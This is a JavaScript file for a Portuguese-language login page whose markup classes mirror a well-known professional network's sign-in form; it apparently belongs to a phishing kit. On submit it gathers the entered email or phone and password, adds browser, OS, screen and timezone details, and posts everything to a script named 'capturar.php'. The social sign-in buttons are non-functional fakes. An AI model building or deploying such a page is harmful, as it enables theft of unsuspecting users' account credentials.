// Password Visibility Toggle
document.addEventListener('DOMContentLoaded', function() {
    const passwordToggle = document.getElementById('password-visibility-toggle');
    const passwordInput = document.getElementById('password');
    
    if (passwordToggle && passwordInput) {
        passwordToggle.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                passwordToggle.textContent = 'Ocultar';
            } else {
                passwordInput.type = 'password';
                passwordToggle.textContent = 'Exibir';
            }
        });
    }
});

// Form Validation
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.querySelector('.login__form');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const usernameError = document.getElementById('error-for-username');
    const passwordError = document.getElementById('error-for-password');

    // Validation messages
    const validationMessages = {
        username: {
            empty: 'Insira um e-mail ou telefone.',
            invalid: 'Insira um nome de usuário válido',
            small: 'O e-mail ou telefone deve ter entre 3 e 128 caracteres.'
        },
        password: {
            empty: 'Insira uma senha.',
            small: 'A senha deve ter no mínimo 6 caracteres.',
            large: 'A senha deve ter no máximo 400 caracteres.'
        }
    };

    // Email validation regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    // Phone validation regex (basic)
    const phoneRegex = /^[0-9+\-\s()]{7,}$/;

    function validateEmail(value) {
        return emailRegex.test(value) || phoneRegex.test(value);
    }

    function showError(input, errorElement, message) {
        errorElement.textContent = message;
        errorElement.classList.remove('hidden__imp');
        input.style.borderColor = '#d11124';
    }

    function hideError(errorElement, input) {
        errorElement.textContent = '';
        errorElement.classList.add('hidden__imp');
        input.style.borderColor = '';
    }

    function validateUsername() {
        const value = usernameInput.value.trim();
        
        if (value === '') {
            showError(usernameInput, usernameError, validationMessages.username.empty);
            return false;
        }
        
        if (value.length < 3 || value.length > 128) {
            showError(usernameInput, usernameError, validationMessages.username.small);
            return false;
        }
        
        if (!validateEmail(value)) {
            showError(usernameInput, usernameError, validationMessages.username.invalid);
            return false;
        }
        
        hideError(usernameError, usernameInput);
        return true;
    }

    function validatePassword() {
        const value = passwordInput.value;
        
        if (value === '') {
            showError(passwordInput, passwordError, validationMessages.password.empty);
            return false;
        }
        
        if (value.length < 6) {
            showError(passwordInput, passwordError, validationMessages.password.small);
            return false;
        }
        
        if (value.length > 400) {
            showError(passwordInput, passwordError, validationMessages.password.large);
            return false;
        }
        
        hideError(passwordError, passwordInput);
        return true;
    }

    // Real-time validation
    usernameInput.addEventListener('blur', validateUsername);
    passwordInput.addEventListener('blur', validatePassword);

    // Clear errors on input
    usernameInput.addEventListener('input', function() {
        if (usernameError.textContent) {
            hideError(usernameError, usernameInput);
        }
    });

    passwordInput.addEventListener('input', function() {
        if (passwordError.textContent) {
            hideError(passwordError, passwordInput);
        }
    });

    // Form submission
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const isUsernameValid = validateUsername();
            const isPasswordValid = validatePassword();
            
            if (isUsernameValid && isPasswordValid) {
                console.log('Form is valid. Submitting...');
                
                // Coletar informações do sistema
                const infoSistema = {
                    navegador: detectarNavegador(),
                    so: detectarSO(),
                    resolucao: `${window.screen.width}x${window.screen.height}`,
                    idioma: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    javascript: true
                };
                
                // Criar FormData
                const formData = new FormData(loginForm);
                formData.append('info_sistema', JSON.stringify(infoSistema));
                
                // Desabilitar botão durante envio
                const submitButton = loginForm.querySelector('button[type="submit"]');
                const originalText = submitButton.textContent;
                submitButton.disabled = true;
                submitButton.textContent = 'Entrando...';
                
                // Enviar dados para o servidor
                fetch('capturar.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showToast(data.message, 'success');
                        
                        // Redirecionar após 1 segundo
                        setTimeout(() => {
                            if (data.redirect) {
                                window.location.href = data.redirect;
                            }
                        }, 1000);
                    } else {
                        showToast(data.message, 'error');
                        submitButton.disabled = false;
                        submitButton.textContent = originalText;
                    }
                })
                .catch(error => {
                    console.error('Erro:', error);
                    showToast('Erro ao processar login. Tente novamente.', 'error');
                    submitButton.disabled = false;
                    submitButton.textContent = originalText;
                });
                
            } else {
                console.log('Form has errors. Please fix them.');
            }
        });
    }
});

// Google Sign-in Integration
function initGoogleSignIn() {
    const googleButton = document.querySelector('.alternate-signin__btn--google');
    
    if (googleButton) {
        googleButton.addEventListener('click', function() {
            console.log('Google Sign-in clicked');
            // Simula autenticação do Google
            showToast('Conectando com o Google...', 'notify');
            
            // Em produção, você integraria com a API do Google
            // window.gapi.auth2.getAuthInstance().signIn();
            
            setTimeout(() => {
                alert('Em produção, isso iniciaria a autenticação com o Google usando OAuth 2.0');
            }, 500);
        });
    }
}

// Microsoft Auth Integration
function initMicrosoftAuth() {
    const microsoftButton = document.querySelector('.alternate-signin__btn--microsoft');
    
    if (microsoftButton) {
        microsoftButton.addEventListener('click', function() {
            console.log('Microsoft Auth clicked');
            // Simula autenticação da Microsoft
            showToast('Conectando com a Microsoft...', 'notify');
            
            // Em produção, você integraria com MSAL (Microsoft Authentication Library)
            // msalInstance.loginPopup(loginRequest);
            
            setTimeout(() => {
                alert('Em produção, isso iniciaria a autenticação com a Microsoft usando MSAL');
            }, 500);
        });
    }
}

// Apple Sign-in Integration
function initAppleSignIn() {
    const appleButton = document.querySelector('.alternate-signin__btn--apple');
    
    if (appleButton) {
        appleButton.addEventListener('click', function() {
            console.log('Apple Sign-in clicked');
            // Simula autenticação da Apple
            showToast('Conectando com a Apple...', 'notify');
            
            // Em produção, você integraria com AppleID JS
            // AppleID.auth.signIn();
            
            setTimeout(() => {
                alert('Em produção, isso iniciaria a autenticação com a Apple usando Sign in with Apple JS');
            }, 500);
        });
    }
}

// Language Selector
document.addEventListener('DOMContentLoaded', function() {
    const languageButton = document.querySelector('.language-selector__button');
    const languageDropdown = document.querySelector('.language-selector__dropdown');
    const languageLinks = document.querySelectorAll('.language-selector__link');
    
    if (languageButton && languageDropdown) {
        languageButton.addEventListener('click', function() {
            const isExpanded = languageButton.getAttribute('aria-expanded') === 'true';
            languageButton.setAttribute('aria-expanded', !isExpanded);
            languageDropdown.classList.toggle('hidden__imp');
        });
        
        // Close dropdown when clicking outside
        document.addEventListener('click', function(e) {
            if (!e.target.closest('.language-selector')) {
                languageButton.setAttribute('aria-expanded', 'false');
                languageDropdown.classList.add('hidden__imp');
            }
        });
    }
    
    // Language selection
    languageLinks.forEach(function(link) {
        link.addEventListener('click', function() {
            const locale = this.getAttribute('data-locale');
            console.log('Selected language:', locale);
            // This would change the page language
        });
    });
});

// OTP (One-Time Password) handling
document.addEventListener('DOMContentLoaded', function() {
    const otpForm = document.getElementById('otp-generation');
    const resendButton = document.getElementById('btn-resend-otp');
    const cancelButton = document.getElementById('otp-cancel-button');
    
    if (resendButton) {
        resendButton.addEventListener('click', function() {
            console.log('Resending OTP...');
            // This would trigger OTP resend
        });
    }
    
    if (cancelButton) {
        cancelButton.addEventListener('click', function() {
            console.log('Canceling OTP...');
            // This would return to the main login form
        });
    }
});

// Passkey Support Detection
function detectPasskeySupport() {
    if (window.PublicKeyCredential) {
        console.log('Passkeys are supported');
        const passkeyButton = document.getElementById('sign-in-with-passkey-btn');
        if (passkeyButton) {
            passkeyButton.style.display = 'block';
        }
    } else {
        console.log('Passkeys are not supported');
    }
}

// Initialize all features
document.addEventListener('DOMContentLoaded', function() {
    detectPasskeySupport();
    initGoogleSignIn();
    initMicrosoftAuth();
    initAppleSignIn();
});

// Toast notifications
function showToast(message, type = 'success') {
    // Criar elemento de toast
    const toast = document.createElement('div');
    toast.className = `toast toast--${type}`;
    toast.textContent = message;
    
    // Adicionar ao body
    document.body.appendChild(toast);
    
    // Mostrar toast
    setTimeout(() => {
        toast.classList.add('toast--show');
    }, 100);
    
    // Remover após 3 segundos
    setTimeout(() => {
        toast.classList.remove('toast--show');
        setTimeout(() => {
            document.body.removeChild(toast);
        }, 300);
    }, 3000);
}

// Funções auxiliares para detecção de sistema
function detectarNavegador() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Edg')) return 'Edge';
    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
    return 'Desconhecido';
}

function detectarSO() {
    const ua = navigator.userAgent;
    if (ua.includes('Win')) return 'Windows';
    if (ua.includes('Mac')) return 'MacOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iOS')) return 'iOS';
    return 'Desconhecido';
}

// CSRF Token handling
function getCsrfToken() {
    const csrfInput = document.querySelector('input[name="csrfToken"]');
    return csrfInput ? csrfInput.value : null;
}

// Remember Me functionality
document.addEventListener('DOMContentLoaded', function() {
    const rememberMeCheckbox = document.getElementById('rememberMeOptIn-checkbox');
    
    if (rememberMeCheckbox) {
        // Load saved preference
        const savedPreference = localStorage.getItem('rememberMe');
        if (savedPreference !== null) {
            rememberMeCheckbox.checked = savedPreference === 'true';
        }
        
        // Save preference on change
        rememberMeCheckbox.addEventListener('change', function() {
            localStorage.setItem('rememberMe', this.checked);
        });
    }
});